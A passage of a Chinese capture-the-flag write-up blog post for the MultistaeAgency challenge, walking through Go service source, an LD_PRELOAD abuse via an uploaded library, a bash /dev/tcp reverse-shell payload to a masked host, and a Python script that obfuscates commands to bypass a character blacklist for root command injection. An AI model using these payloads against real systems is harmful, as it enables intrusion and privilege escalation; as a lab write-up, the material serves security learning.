class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;ListenAndServe: &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再看看docker-compose.yml</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">FROM</span> <span class="string">golang:latest</span></span><br><span class="line"></span><br><span class="line"><span class="string">RUN</span> <span class="string">mkdir</span> <span class="string">-p</span> <span class="string">/code/logs</span></span><br><span class="line"></span><br><span class="line"><span class="string">COPY</span> <span class="string">.</span> <span class="string">/code</span></span><br><span class="line"></span><br><span class="line"><span class="string">WORKDIR</span> <span class="string">/code</span></span><br><span class="line"></span><br><span class="line"><span class="string">RUN</span> <span class="string">go</span> <span class="string">build</span> <span class="string">-o</span> <span class="string">bin/web</span> <span class="string">web/main.go</span> <span class="string">&amp;&amp;</span> <span class="string">\</span></span><br><span class="line">    	<span class="string">go</span> <span class="string">build</span> <span class="string">-o</span> <span class="string">bin/proxy</span> <span class="string">proxy/main.go</span> <span class="string">&amp;&amp;</span> <span class="string">\</span></span><br><span class="line">    	<span class="string">go</span> <span class="string">build</span> <span class="string">-o</span> <span class="string">bin/server</span> <span class="string">server/main.go</span></span><br><span class="line"></span><br><span class="line"><span class="string">RUN</span> <span class="string">chmod</span> <span class="string">-R</span> <span class="number">777</span> <span class="string">/code</span></span><br><span class="line"></span><br><span class="line"><span class="string">RUN</span> <span class="string">useradd</span> <span class="string">web</span></span><br><span class="line"></span><br><span class="line"><span class="string">ADD</span> <span class="string">flag</span> <span class="string">/flag</span></span><br><span class="line"></span><br><span class="line"><span class="string">RUN</span> <span class="string">chmod</span> <span class="number">400</span> <span class="string">/flag</span></span><br><span class="line"></span><br><span class="line"><span class="string">ENTRYPOINT</span>  <span class="string">&quot;/code/start.sh&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>start.sh</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> `<span class="built_in">cat</span> /proc/sys/kernel/random/uuid  | <span class="built_in">md5sum</span> |<span class="built_in">cut</span> -c 1-9` &gt; /tmp/secret/key</span><br><span class="line">su - web -c <span class="string">&quot;/code/bin/web 2&gt;&amp;1  &gt;/code/logs/web.log &amp;&quot;</span></span><br><span class="line">su - web -c <span class="string">&quot;/code/bin/proxy 2&gt;&amp;1  &gt;/code/logs/proxy.log &amp;&quot;</span></span><br><span class="line"></span><br><span class="line">/code/bin/server 2&gt;&amp;1  &gt;/code/logs/server.log &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> -f /code/logs/*</span><br></pre></td></tr></table></figure>
+
+<p>可以知道有三个服务，web，server，proxy</p>
+<p>其中web和proxy是web权限，server是root权限登录</p>
+<p>flag是400权限，需要root权限</p>
+<p>再看看sever&#x2F;main.go（主要功能）</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">manage</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	values := r.URL.Query()</span><br><span class="line">	m := values.Get(<span class="string">&quot;m&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> !waf(m) &#123;</span><br><span class="line">		fmt.Fprintf(w, <span class="string">&quot;waf!&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	cmd := fmt.Sprintf(<span class="string">&quot;rm -rf uploads/%s&quot;</span>, m)</span><br><span class="line">	fmt.Println(cmd)</span><br><span class="line">	command := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd)</span><br><span class="line">	outinfo := bytes.Buffer&#123;&#125;</span><br><span class="line">	outerr := bytes.Buffer&#123;&#125;</span><br><span class="line">	command.Stdout = &amp;outinfo</span><br><span class="line">	command.Stderr = &amp;outerr</span><br><span class="line">	err := command.Start()</span><br><span class="line">	res := <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err = command.Wait(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		res = outerr.String()</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res = outinfo.String()</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintf(w, res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">waf</span><span class="params">(c <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> t <span class="type">int32</span></span><br><span class="line">	t = <span class="number">0</span></span><br><span class="line">	blacklist := []<span class="type">string</span>&#123;<span class="string">&quot;.&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;?&quot;</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> _, s := <span class="keyword">range</span> c &#123;</span><br><span class="line">		<span class="keyword">for</span> _, b := <span class="keyword">range</span> blacklist &#123;</span><br><span class="line">			<span class="keyword">if</span> b == <span class="type">string</span>(s) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> unicode.IsLetter(s) &#123;</span><br><span class="line">			<span class="keyword">if</span> t == s &#123;</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> t == <span class="number">0</span> &#123;</span><br><span class="line">				t = s</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中m的值是可控的，然后格式化字符串后，就执行bash的命令。但是flag需要root权限读(文件所有者是root，用户组是普通用户)，所以我们的目的还是需要执行server的<code>exec</code>命令</p>
+<p>对于GET传参可控的话，直接拿<code>分号</code>分割命令然后读flag即可。</p>
+<p>在前面token路由可以设置环境变量，加上可以上传文件。</p>
+<p>我们可以上传一个<code>so</code>文件的动态链接库，然后<code>LD_PRELOAD</code>来加载一个上传的恶意so文件，就可以达到一个命令执行。</p>
+<p>proxy&#x2F;main.go</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	file, err := os.Open(<span class="string">&quot;secret/key&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> file.Close()</span><br><span class="line">	content, err := ioutil.ReadAll(file)</span><br><span class="line">	SecretKey := <span class="type">string</span>(content)</span><br><span class="line">	proxy := goproxy.NewProxyHttpServer()</span><br><span class="line">	proxy.Verbose = <span class="literal">true</span></span><br><span class="line">	proxy.OnRequest().DoFunc(</span><br><span class="line">		<span class="function"><span class="keyword">func</span><span class="params">(r *http.Request,ctx *goproxy.ProxyCtx)</span></span>(*http.Request,*http.Response) &#123;</span><br><span class="line">			r.Header.Set(<span class="string">&quot;Secretkey&quot;</span>,SecretKey)</span><br><span class="line">			<span class="keyword">return</span> r,<span class="literal">nil</span></span><br><span class="line">		&#125;)</span><br><span class="line">	log.Print(<span class="string">&quot;start listen 8080&quot;</span>)</span><br><span class="line">	log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, proxy))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们再来看看其中一个 js 文件 <code>app.67303823400ea75ce4a3.js</code>，它的 SourceMap 也给出了：</p>
+<p><img src="/image/5.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sourcemap 记录了源代码和编译后代码的相关信息，可以将编译后代码映射为源代码，以帮助开发人员排查问题代码出现的位置，进而对问题代码进行修复。</span><br></pre></td></tr></table></figure>
+
+<p>使用如下命令进行恢复</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --global reverse-sourcemap</span><br><span class="line">reverse-sourcemap -v app.67303823400ea75ce4a3.js.map -o test</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/6.png" alt="img"></p>
+<p>发现请求 token 会自动加上 <code>?http_proxy=127.0.0.1:8080</code></p>
+<p>所以就可以拿到我们自己的token</p>
+<p><img src="/image/7.png" alt="img"></p>
+<p>既然知道了token，就可以开始执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/token?http_proxy=127.0.0.1:8080&amp;LD_PRELOAD=/code/uploads/d9d70853e8b721f98b5f664166132d90/XVlBz&amp;cmd=ls /</span><br></pre></td></tr></table></figure>
+
+<p>但是读不了flag，因为权限问题</p>
+<p>先弹个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/token?http_proxy=127.0.0.1:8080&amp;LD_PRELOAD=/code/uploads/d9d70853e8b721f98b5f664166132d90/XVlBz&amp;cmd=bash -c &#x27;exec bash -i %26&gt;/dev/tcp/xxxxx/9999 &lt;%261&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们可以利用curl去请求具有root权限的server中的&#x2F;manage路由，调用它的bash命令</p>
+<p>关键是怎么绕过waf，过滤了. * ?</p>
+<p>脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = &quot;bash -c &#x27;expr $(grep + /tmp/out)&#x27; | /get_flag &gt; /tmp/out; cat /tmp/out&quot;</span></span><br><span class="line">a = <span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">    a = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">out = <span class="string">r&quot;$&#123;!#&#125;&lt;&lt;&lt;&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;bash -c &quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">        out += <span class="string">&#x27;,&#x27;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    out += <span class="string">r&quot;\$\&#x27;\\&quot;</span></span><br><span class="line">    out += <span class="string">r&quot;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#&quot;</span></span><br><span class="line">    <span class="keyword">for</span> binchar <span class="keyword">in</span> <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]:</span><br><span class="line">        <span class="keyword">if</span> binchar == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            out += <span class="string">r&quot;$&#123;##&#125;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out += <span class="string">r&quot;$#&quot;</span></span><br><span class="line">    out += <span class="string">r&quot;))&quot;</span></span><br><span class="line">    out += <span class="string">r&quot;\&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">out += <span class="string">r&quot;\$\&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> a:</span><br><span class="line">    out += <span class="string">r&quot;\\&quot;</span></span><br><span class="line">    out += <span class="string">r&quot;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#&quot;</span></span><br><span class="line">    <span class="keyword">for</span> binchar <span class="keyword">in</span> <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]:</span><br><span class="line">        <span class="keyword">if</span> binchar == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            out += <span class="string">r&quot;$&#123;##&#125;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out += <span class="string">r&quot;$#&quot;</span></span><br><span class="line">    out += <span class="string">r&quot;))&quot;</span></span><br><span class="line">out += <span class="string">r&quot;\&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">out += <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;out =&#x27;</span>, out)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;quote(out) =&#x27;</span>, quote(out))</span><br></pre></td></tr></table></figure>
+
+<p>m参数先用一个%3b也就是分号来分割命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:9091/manage?m=%3b%24%7B%21%23%7D%3C%3C%3C%7B%5C%24%5C%27%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%23%24%23%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D%24%23%29%29%5C%27%5C%24%5C%27%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%23%24%23%24%7B%23%23%7D%24%7B%23%23%7D%24%23%24%7B%23%23%7D%29%29%5C%27%5C%24%5C%27%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%7B%23%23%7D%24%23%24%23%24%23%24%7B%23%23%7D%24%7B%23%23%7D%29%29%5C%27%5C%24%5C%27%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%23%24%7B%23%23%7D%24%23%24%7B%23%23%7D%24%7B%23%23%7D%24%23%29%29%5C%27%2C%5C%24%5C%27%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%7B%23%23%7D%24%23%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D%29%29%5C%27%5C%24%5C%27%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%23%24%23%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D%29%29%5C%27%2C%5C%24%5C%27%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%23%24%23%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D%29%29%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%23%24%23%24%7B%23%23%7D%24%7B%23%23%7D%24%23%24%7B%23%23%7D%29%29%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%7B%23%23%7D%24%23%24%23%24%7B%23%23%7D%24%23%24%23%29%29%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%7B%23%23%7D%24%23%24%23%24%23%29%29%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%7B%23%23%7D%24%7B%23%23%7D%24%23%24%23%24%7B%23%23%7D%29%29%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%23%24%7B%23%23%7D%24%23%24%23%24%7B%23%23%7D%24%23%29%29%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%23%24%7B%23%23%7D%24%7B%23%23%7D%24%23%24%7B%23%23%7D%24%23%29%29%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%23%24%23%24%7B%23%23%7D%24%7B%23%23%7D%24%23%24%7B%23%23%7D%29%29%5C%5C%24%28%28%24%28%28%24%7B%23%23%7D%3C%3C%24%7B%23%23%7D%29%29%23%24%7B%23%23%7D%24%23%24%23%24%7B%23%23%7D%24%23%24%23%24%7B%23%23%7D%24%7B%23%23%7D%29%29%5C%27%7D</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/05/09/5-9%E6%97%A5%E5%B8%B8/" rel="prev" title="5-9日常">
+      <i class="fa fa-chevron-left"></i> 5-9日常
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/05/15/LitCTFweb%E5%A4%8D%E7%8E%B0/" rel="next" title="LitCTFweb复现">
+      LitCTFweb复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HNCTF-2022-WEEK4-fun-sql"><span class="nav-number">1.</span> <span class="nav-text">[HNCTF 2022 WEEK4]fun_sql</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B9%96%E6%B9%98%E6%9D%AF-2021-final-MultistaeAgency"><span class="nav-number">2.</span> <span class="nav-text">[湖湘杯 2021 final]MultistaeAgency</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ycxlo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">50</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ycxlo</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
